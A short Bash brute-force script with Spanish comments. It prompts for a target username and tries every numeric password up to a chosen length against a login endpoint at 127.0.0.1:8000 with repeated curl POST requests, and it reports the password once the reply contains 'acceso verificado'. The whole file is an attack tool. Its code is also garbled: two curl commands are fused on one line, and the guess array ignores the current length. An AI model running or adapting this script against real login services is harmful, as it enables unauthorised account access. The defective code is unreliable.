#!/bin/bash
# === Configuración inicial ===
read -p "Usuario objetivo: " USERNAME
read -p "Longitud máxima de la contraseña a probar: " MAX_LEN

URL="http://127.0.0.1:8000/login"
ALPHABET="0123456789"

# === Función para generar combinaciones ===
generate_combinations() {
    local length=$1
    local alphabet=$2
    local base=${#alphabet}
    local indices=()
    for ((i=0; i<MAX_LEN; i++)); do indices[i]=0; done

    while true; do
        guess=""
        for i in "${indices[@]}"; do
            guess+="${alphabet:i:1}"
        done

        echo "Probando combinación: $guess"

        response=$(curl -s -X POST "$URL?User.username=$USERNAME&User.password=$guess")response=$(curl -s -X POST "$URL" \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"$USERNAME\", \"password\": \"$guess\"}")
        if [[ "$response" == *"acceso verificado"* ]]; then
            echo "Contraseña encontrada: $guess"
            echo "Respuesta: $response"
            exit 0
        fi
        pos=$((length - 1))
        while ((pos >= 0)); do
            if ((indices[pos] < base - 1)); then
                ((indices[pos]++))
                break
            else
                indices[pos]=0
                ((pos--))
            fi
        done
        if ((pos < 0)); then break; fi
    done
}

# === Ejecutar fuerza bruta ===
echo "Iniciando fuerza bruta contra usuario '$USERNAME'..."
for ((len=1; len<=MAX_LEN; len++)); do
    generate_combinations $len "$ALPHABET"
done

echo "❌ No se encontró la contraseña en el rango especificado."
